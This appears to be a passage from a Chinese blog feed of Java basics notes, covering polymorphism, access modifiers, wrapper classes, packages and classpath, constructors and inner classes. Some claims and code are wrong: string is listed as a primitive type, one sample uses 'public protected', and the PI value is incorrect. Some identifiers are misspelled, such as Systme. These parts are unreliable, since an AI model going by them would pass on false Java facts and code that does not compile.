<h1 id="方法调用与多态"><a href="#方法调用与多态" class="headerlink" title="方法调用与多态"></a>方法调用与多态</h1><p><strong>一个被定义为指向超类的变量可以指向子类，反之行不通</strong>。一个变量对象可以指向多种实际类型的现象被称为<code>多态</code>，在运行时能自动选择调用哪个方法的现象称为<code>动态绑定</code>。对于private、static、final方法，编译器可以准确地知道应该调用哪个方法，称为<code>静态绑定</code></p>
<h2 id="理解方法调用"><a href="#理解方法调用" class="headerlink" title="理解方法调用"></a>理解方法调用</h2><p>假设要调用x.f(args)。其中x为隐式参数，声明为类C的一个对象，下面是调用过程描述：</p>
<ol>
<li>编译器查看对象的声明类型和方法名。可能存在多个名字为f，但参数类型不一样的方法。编译器会一一列举所有C类中名为f的方法和其超类中访问属性为public且名为f的方法。<em>至此编译器已获得所有可能被调用的候选方法</em></li>
<li>编译器查看调用方法是提供的参数类型。如果所有名为f的方法中存在一个与提供的参数类型完全匹配，就选择这个方法。这个过程被称为<code>重载解析</code>。由于存在类型转换，所以该过程也遵循“相似原则”，形参类型与实参匹配度最高的优先。<em>至此编译器已获得需要调用的方法名字和参数类型，即方法签名</em></li>
<li>在jvm创建的<code>方法表</code>中搜索相应的方法。每次调用都要进行搜索，开销太大。jvm创建了一张方法表，里面存放着方法签名与实际调用方法的映射关系。</li>
</ol>
<h1 id="阻止继承：final类和方法"><a href="#阻止继承：final类和方法" class="headerlink" title="阻止继承：final类和方法"></a>阻止继承：final类和方法</h1><p>不允许扩展的类被称为<code>final类</code>。如果定义类的时候用了<code>final</code>修饰符就表明这个类是final类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Programmer</span> <span class="keyword">extends</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>类中的方法也可以被声明为<code>final</code>。如果这样做子类就不能覆盖这个方法（final类的所有方法默认为final方法）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将方法或类定义为<code>final</code>最大的好处是防止其在子类中被改变含义。</p>
<h1 id="受保护访问"><a href="#受保护访问" class="headerlink" title="受保护访问"></a>受保护访问</h1><p>最好将类中的域标记为<code>private</code>，任何声明为<code>private</code>的内容对其他类都是不可见的，即使是子类也一样。如果希望子类能够访问超类的私有域或方法，可以用修饰符：<code>protected</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> salary;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">protected</span> <span class="keyword">double</span> <span class="title">getsalary</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.salary;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Java的4种可见性修饰符"><a href="#Java的4种可见性修饰符" class="headerlink" title="Java的4种可见性修饰符"></a>Java的4种可见性修饰符</h1><p>下面是Java用于控制可见性的4种修饰符：  </p>
<ol>
<li>仅对本类可见——private</li>
<li>对所有类可见——public</li>
<li>对本包和所有子类可见——protected</li>
<li>仅对本包可见——默认，不需要修饰符</li>
</ol>
<h1 id="对象包装器"><a href="#对象包装器" class="headerlink" title="对象包装器"></a>对象包装器</h1><p>Java不是完全的面向对象语言，其基本类型：boolean、char、short、int、long、float、double的值都不是对象。而这些基本类型都有与之对应的类。如int对应Integer，char对应Character，void对应Void…对象包装类包装的值都是不变的。</p>
<p>要定义一个整形数组列表，只要：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br></pre></td></tr></table></figure>
<p>此时，调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">list.add(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>编译器将会将其视为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">list.add(Integer.valueOf(<span class="number">3</span>))</span><br></pre></td></tr></table></figure>
<p>这种行为称为<code>自动装箱</code>，与之对应的还有<code>自动拆箱</code>。手动拆箱的方法为<code>Integer.parseInt(Integer obj)</code></p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础—包</title>
    <url>/2018/06/15/Java%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E2%80%94%E2%80%94%E5%8C%85/</url>
    <content><![CDATA[<p>Java 允许使用包（package）将类组织起来，使用包的主要原因是确保类名的唯一性。如果有两个名字相同的类，只要把它们放在不同的包中就不会有影响。</p>
<p>从编译器（compiler）的角度看，嵌套的包之间没有任何关系。例如java.util包与 java.util 包毫无关系，每一个都拥有独立的类集合。</p>
<p>当编译一个 .java 文件（即一个编译单元）时，在.java文件中的每个类都会有一个输出文件，而该输出文件的名称与 .java 文件中每个类的名称相同，只是多了一个后缀名 .class。因此在编译少量 .java 文件之后，会得到大量的 .class 文件。每一个 .java 文件编译以后都会有一个 public 类，以及任意数量的非 public 类。因此每个 .java 文件都是一个构件，如果希望许许多多的这样的构件从属于同一个群组，就可以在每一个 .java 文件中使用关键字 package。而这个群组就是一个类库。</p>
<p>就表示你在声明该编译单元是名为 fruit 的类库的一部分，或者换句话说，你正在声明该编译单元中的 public 类名称是位于 fruit 名称的保护伞下，由 fruit 名称罩着。任何想要使用该 public 类名称的人都必须指定全名或者与 fruit 结合使用关键字 import。</p>
<h1 id="包作用域"><a href="#包作用域" class="headerlink" title="包作用域"></a>包作用域</h1><p>一个类、方法或变量如果没有指定 <code>private</code> 或 <code>public</code>，则可以被同一个包中的所有方法访问（如非公）。</p>
<h1 id="将类放入包中"><a href="#将类放入包中" class="headerlink" title="将类放入包中"></a>将类放入包中</h1><p>要想将类放入包中，就必须将包的名字放在源文件的开头。包中定义类的代码之前。使用关键字 <code>package</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件名为Employee.java，位于目录com/qiuyueqy/learnjava下</span></span><br><span class="line"><span class="keyword">package</span> com.qiuyueqy.learnjava;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码表明编译单元位于 com.qiuyueqy.learnjava 的保护伞下，任何想要使用该 public 类的人必须指定全名或使用修饰符 <code>import</code></p>
<p>如果没有在源文件中放置 package 语句，这个源文件中的类就被放置在一个默认包（default package）中。默认包是一个没有名字的包</p>
<p><strong>编译器对文件（以 .java 为扩展名）进行操作，而java解释器加载类（以. class 为扩展名）</strong></p>
<h2 id="类的导入"><a href="#类的导入" class="headerlink" title="类的导入"></a>类的导入</h2><p>一个类可以使用所属包中所有的类，一起其他包的公有类。可以用两种方式访问其他包的公有类：</p>
<ul>
<li>在类名前加上完整的包名<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.time.LocalDate date = <span class="keyword">new</span> java.time.LoalcDate.now();</span><br><span class="line">``` </span><br><span class="line">- 通过关键字`<span class="keyword">import</span>`导入，**`<span class="keyword">import</span>`必须在`<span class="keyword">package</span>`之后**</span><br><span class="line">```java</span><br><span class="line"><span class="keyword">package</span> com.qiuyueqy.learnjava;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="静态导入"><a href="#静态导入" class="headerlink" title="静态导入"></a>静态导入</h2><p><code>import</code>语句不仅可以导入类，还可以导入类的静态方法和静态域：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 导入System类的静态方法和静态域</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Systme.*;</span><br></pre></td></tr></table></figure></p>
<p>这样就可以使用System类的静态方法和域，而不用加前缀：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">out.println(<span class="string">"Hello World!"</span>); <span class="comment">// System.out.println()</span></span><br><span class="line">exit(<span class="number">0</span>); <span class="comment">// System.exit()</span></span><br></pre></td></tr></table></figure></p>
<h2 id="类路径"><a href="#类路径" class="headerlink" title="类路径"></a>类路径</h2><p>javac 编译器要查询一个编译单元，会先从当前包开始，然后查询所有 <code>import</code> 语句，确定<code>import</code>语句导入的包中是否包含所需要的类。</p>
<p>java 虚拟机（jvm）查询类文件时，它首先在 jre/lib 和 jre/lib/ext 目录下的归档文件中所存放的系统类文件里找，如果找不到再从环境变量 CLASSPATH（可以通过操作系统来设置）里面找。CLASSPATH包含一个或多个目录，用作查找 .class 文件的根目录。从根目录开始，解释器获取包名称并将每个句点替换成反斜杠，以从 CLASSPATH 根中产生一个路径（例如，package fruit.Apple 就变成为 fruit/Apple 或 fruit/Apple 或其他，这将取决于操作系统）。得到的路径会与 CLASSPATH 中的各个不同的根目录路径相连接以获得一个完整的目录路径，解释器就在这些目录中查找与你所需要的类名称相同的 .class 文件。</p>
<p>类文件默认与 java 文件处于同一位置，但也可以存储在 jar（java 归档）文件中。jar 文件是多个压缩形式的类文件和子目录的集合。通过使用 jar 文件可以使类被多个程序共享。为了达到这个目的，需要做到以下几点：</p>
<ol>
<li>把类放到一个目录中。这个目录是一个树状结构的基目录。例如：<strong>如果希望将com.qiuyueqy.learnjava类添加到其中，这个 learnjava.class 类文件就必须位于子目录 /home/user/classdir/com/qiuyueqy中</strong></li>
<li>将jar文件放在非类路径中，如：/home/user/archives</li>
<li>设置类路径（class path）。<strong>类路径是所有包含类文件的路径的集合</strong>。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/home/user/classdir:.:/home/user/archives/archives.jar // Linux下</span><br><span class="line"></span><br><span class="line">C:\classdir;.;C:\archives\archives.jar // windows下</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>类路径包括：</p>
<ul>
<li>基目录: 如 /home/user/classdir和C:\classdir</li>
<li>当前目录: .</li>
<li>jar文件： 如 /home/user/archives/archives.jar 或 C:\archives\archives.jar</li>
</ul>
<h2 id="设置类路径"><a href="#设置类路径" class="headerlink" title="设置类路径"></a>设置类路径</h2><p>最好通过<code>-classpath</code>或<code>-cp</code>选项指定类路径，例如要执行Employee.class：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -classpath /home/user/classdir:.:/home/user/archives/archives.jar Employee</span><br></pre></td></tr></table></figure></p>
<p>也可以通过设置环境变量<code>CLASSPAHT</code>。默认CLASSPATH为<code>.</code>，改为我们需要的路径集合:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set CLASSPATH=C:\classdir;.;C:\archives\archives.jar //windows下</span><br><span class="line"></span><br><span class="line">export CLASSPATH=/home/user/classdir:.:/home/user/archives/archives.jar // Linux下</span><br></pre></td></tr></table></figure></p>
<p>这样在shell退出前CLASSPATH变量都有效</p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础—类与接口</title>
    <url>/2018/06/13/Java%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%8E%A5%E5%8F%A3%E4%B8%8E%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="对象与对象变量"><a href="#对象与对象变量" class="headerlink" title="对象与对象变量"></a>对象与对象变量</h1><p><strong>Java中，只有基本类型(primitive types)不是对象，例如number，string和boolean</strong>。</p>
<p>首先要清楚：对象与对象变量是不一样的。对象变量只是对对象的一个引用。</p>
<p>想使用对象变量，首先要构造对象并指定其初始状态。<br>在定义类时，使用<code>构造器</code>指出如何初始化这个类，在构造一个新实例时，构造器会运行，将实例域初始化为所希望的状态。<strong>构造器是一种特殊的方法，没有返回值</strong>。构造器的名字与类名相同。<strong>一个类有一个或多个构造器方法</strong>。不要在构造器中定义与实例域重名的局部变量，否则编译器会报错。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bird</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String colour;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面这个就是构造器，方法名与类名相同</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Bird</span><span class="params">(String c, <span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.colour = c;</span><br><span class="line">        <span class="keyword">this</span>.sex = s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>要构造一个对象，需要在构造器前面加上<code>new</code>操作符：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Bird bird = <span class="keyword">new</span> Bird(<span class="string">"绿色"</span>, <span class="number">0</span>) <span class="comment">// 这里的Bird应该理解为调用Bird类的构造器，构造器前加上new操作符</span></span><br></pre></td></tr></table></figure></p>
<p>bird是一个对象变量，并没有实际包含一个对象，而仅仅引用一个对象。<strong>任何对象变量的值都是对存储在另一个地方的一个对象的引用</strong></p>
<h1 id="更改器方法与访问器方法"><a href="#更改器方法与访问器方法" class="headerlink" title="更改器方法与访问器方法"></a>更改器方法与访问器方法</h1><p>对于每个特定的类实例，都有一组特定的实例域值，这些值的集合就是这个对象的<code>当前状态</code>。<br>实现封装的关键是绝不能让类中的方法直接地访问其他类的实例域。程序仅能通过对象的方法与对象的实例域进行交互。对象的方法会改变原对象的状态，称之为更改器方法。只访问实例域而不改变原对象状态的方法，称之为访问器方法。</p>
<p>访问器方法不要返回可变对象，否则获取这个对象后通过调用可变对象的更改器方法会破坏封装性！</p>
<h1 id="自定义类"><a href="#自定义类" class="headerlink" title="自定义类"></a>自定义类</h1><p>关键字<code>public</code>修饰的类称为共有类。<strong>在一个.java源文件（编译单元）中，只能有一个共有类，类名与文件名相同</strong>。可以有多个非公有类。包之外的世界是无法看见这些非公有类的，因为它们不是public类，而且它们主要用来为公有类提供支持。</p>
<p>关键字<code>public</code>修饰的方法、字段意味着任何类的任何方法都可以通过点操作调用这些方法和字段，而<code>private</code>确保只有自身类可以访问这些实例域或方法。（<strong>同属一个类的实例可以互相访问访问私有域</strong>）</p>
<p>可以把实例域定义为<code>final</code>。构造对象时必须要初始化这样的域（构造器之前<br>），并且在后面的操作中不能再对它进行改变。</p>
<h1 id="静态域"><a href="#静态域" class="headerlink" title="静态域"></a>静态域</h1><p>如果将域定义为<code>static</code>，每个类中只有一个这样的域。而每个对象对于所有的实例域却都有自己的一份拷贝。这样就把实例域与静态域区分开来：每个实例有自己的实例域，而各个实例共享一个静态域。</p>
<h1 id="静态常量"><a href="#静态常量" class="headerlink" title="静态常量"></a>静态常量</h1><p>例如，在Math类中定义圆周率：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Math</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">double</span> PI = <span class="number">3.14159265758</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在程序中，可以使用<code>Math.PI</code>获取这个常量。<br>如果关键字<code>static</code>被省略，PI就变成了Math类的一个实例域。需要通过Math类的对象访问PI，并且每一个Math对象都有他自己的一份PI拷贝<br>每个类对象都可以对公有域进行修改，所以最好不要把域设计成<code>public</code>。然而共有常量（即final域）却没有这个问题，因为PI被声明为<code>final</code>，不允许再修改它的值。</p>
<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><p>方法封装了一系列语句所描述的运算。方法需要参数（某种数据类型的值）并根据参数计算出某种数据类型的返回值（例如数学函数的结果）或者产生某种副作用（例如main函数）</p>
<h2 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h2><p>静态方法是一种不能向对象实施操作的方法。可以认为静态方法是没有<code>this</code>参数的方法。静态方法不能访问实例域，因为它不能操作对象，但是静态方法可以访问自身类的静态域。一下两种情况适合用静态方法：</p>
<ol>
<li>一个方法不需要访问对象状态，其所需要的参数都是通过显示参数提供</li>
<li>一个方法只需要访问类的静态域</li>
</ol>
<p>静态方法还有一种常见用途就是用静态工厂方法构造对象，而不是使用<code>new</code>构造符。</p>
<h2 id="main方法"><a href="#main方法" class="headerlink" title="main方法"></a>main方法</h2><p>调用静态方法不需要使用对象，同理，main方法也是静态方法。<br>main方法不对任何对象进行操作，事实上，在启动程序时还没有任何一个对象。静态的main方法将执行并创建程序所需要的对象<br>每个类可以有一个main方法，这是常用于类的单元测试的技巧，例如：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> salary;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(String n, <span class="keyword">int</span> a, <span class="keyword">double</span> s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">        <span class="keyword">this</span>.age = a;</span><br><span class="line">        <span class="keyword">this</span>.salary = s;    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Employee e = <span class="keyword">new</span> Employee(<span class="string">"Mike"</span>, <span class="number">21</span>, <span class="number">2354</span>);</span><br><span class="line">        e.raiseSalary(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果想独立测试Employee类，只需执行<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java Employee</span><br></pre></td></tr></table></figure></p>
<p>如果Employee类是一个Application的一部分，可以用如下命令执行程序<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java Application</span><br></pre></td></tr></table></figure></p>
<p>此时Employee中的main方法不会被执行</p>
<h2 id="方法参数"><a href="#方法参数" class="headerlink" title="方法参数"></a>方法参数</h2><p>java的对象引用是<code>按值传递</code>而不是<code>引用调用</code>。<strong>方法得到的是所有参数值得一个拷贝，而不是指针</strong>。方法不能修改传递给它的任何参数变量的内容。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">raiseSalary</span><span class="params">(<span class="keyword">double</span> Salary)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Salary = Salary * <span class="number">3</span>; <span class="comment">// 这不会对Salary对应的实参造成任何影响</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>但是，改变对象参数状态不是一件难事。<strong>由于java得到的是对象引用的拷贝，而对象引用及其拷贝都会指向同一个对象</strong>，所以可以通过改变对象引用拷贝达到修改对象参数的目的：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">raiseSalary</span><span class="params">(Employee e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e.Salary = e.Salary * <span class="number">3</span>; <span class="comment">// 这会修改Employee实例的Salary域</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>总结一下：</p>
<ol>
<li>一个方法不能修改一个基本数据类型的参数</li>
<li>一个方法可以改变一个对象参数的状态</li>
<li>一个方法不能让对象参数引用一个新的对象（即无法改变实参的引用对象，这点也是由按值传递决定的）</li>
</ol>
<h1 id="对象构造"><a href="#对象构造" class="headerlink" title="对象构造"></a>对象构造</h1><p>Java提供了多种编写构造器的机制</p>
<h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><p>多个方法有相同的名字、不同的参数，便产生了重载。编译器必须挑选出具体执行哪个方法，它通过各个方法给出的参数类型与特定方法调用所使用的值类型进行匹配来挑选出相应的方法（这个过程称为重载解析）。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(String aName, <span class="keyword">int</span> aid)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = aName;</span><br><span class="line">        <span class="keyword">this</span>.id = aid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(<span class="keyword">int</span> aid)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">"Employee"</span>;</span><br><span class="line">        <span class="keyword">this</span>.id = aid;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Java允许重载任何方法，而不仅仅是构造器方法。因此，要完整地表述一个方法，需要指出方法名以及参数类型。这叫做方法的<strong>签名（signature）</strong>。例如：String类有4个称为<code>indexOf</code>的公有方法，它们的签名是：</p>
<ul>
<li>indexOf(int)</li>
<li>indexOf(int, int)</li>
<li>indexOf(String)</li>
<li>indexOf(String, int)</li>
</ul>
<p>返回类型不是方法签名的一部分。也就是说：<strong>不能有两个名字相同，参数类型相同，返回值类型却不同的方法</strong></p>
<h2 id="默认域初始化"><a href="#默认域初始化" class="headerlink" title="默认域初始化"></a>默认域初始化</h2><p>如果在构造器中没有显式地给域赋初值，那么就会自动地赋为默认值：数值为0，布尔值为false，对象引用为null。这是域与局部变量的主要不同点。必须明确地初始化方法中的局部变量，而不一定要明确初始化域。</p>
<h2 id="无参数构造器"><a href="#无参数构造器" class="headerlink" title="无参数构造器"></a>无参数构造器</h2><p>很多类都包含一个无参数的构造函数，对象由无参数的构造函数创建时，其状态会设置为适当的默认值：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">this</span>.salary = <span class="number">5000</span>;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果在编写一个类时没有编写构造器，那么系统会提供一个无参数构造器，该构造器将所有实例域设置为默认值：数值为0，布尔值为false，引用对象为null</p>
<h2 id="显示域初始化"><a href="#显示域初始化" class="headerlink" title="显示域初始化"></a>显示域初始化</h2><p>通过重载类的构造器方法啊，可以采用多种形式设置类的实例域的初始化方法，确保无论怎样调用构造器，每个实例域都可以被设置为一个有意义的初值。</p>
<p>可以在类定义中直接将一个值赋给任何域。<strong>在执行构造器之前，先执行赋值操作</strong>。初始值不一定是常量值，也可以调用方法对域进行初始化：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> nextId = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id = assignId();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">assignId</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> r = nextId;</span><br><span class="line">        nextId++;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="调用另一个构造器"><a href="#调用另一个构造器" class="headerlink" title="调用另一个构造器"></a>调用另一个构造器</h2><p>关键字<code>this</code>引用方法的隐式参数。然而，这个关键字还有另一个含义：<br>如果构造器的第一个语句形如：<code>this(...)</code>，这个构造器将调用同一个类的另一个构造器，这样对公共的构造器代码部分只编写一次即可：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(<span class="keyword">double</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 调用另一构造器 Employee(String aName, double aSalary)</span></span><br><span class="line">    <span class="keyword">this</span>(<span class="string">"Employee #"</span> + nextId, s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="对象初始化块"><a href="#对象初始化块" class="headerlink" title="对象初始化块"></a>对象初始化块</h2><p>在一个类的声明中，可以包含多个代码块。只要构造类的对象，这些块就会被执行：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> nextId = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> salary;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化域</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.id = nextId;</span><br><span class="line">        nextId++;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>无论使用哪个构造器构造对象，id域都在对象初始化块中被初始化。首先运行初始化块，然后才运行构造器。</p>
<p><strong>下面是调用构造器的具体处理步骤：</strong></p>
<ol>
<li>所有数据域初始化为默认值（0，false，null）</li>
<li>按照在类声明中出现的次序，依次执行所有的初始化语句和初始化块</li>
<li>如果构造器第一行调用了第二个构造器，则执行第二个构造器主体</li>
<li>执行构造器主体</li>
</ol>
<h1 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h1><p>在一个类的内部还可以定义内部类，内部类又分为静态内部类和非静态内部类：</p>
<h2 id="非静态内部类"><a href="#非静态内部类" class="headerlink" title="非静态内部类"></a>非静态内部类</h2><p>非静态内部类可以访问外部类的私有属性。非静态内部类实例必须依赖于外部类实例而存在，语法为：<code>new outerclass().new innerclass()</code>。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkList</span>&lt;<span class="title">Item</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Node first;</span><br><span class="line">    <span class="keyword">private</span> Node last;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Node next;</span><br><span class="line">        <span class="keyword">private</span> Item item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Item item)</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h2><p>关键字<code>static</code>修饰的内部类为静态内部类，可以没有外部类实例。语法为；<code>new outerclass.innerclass()</code></p>
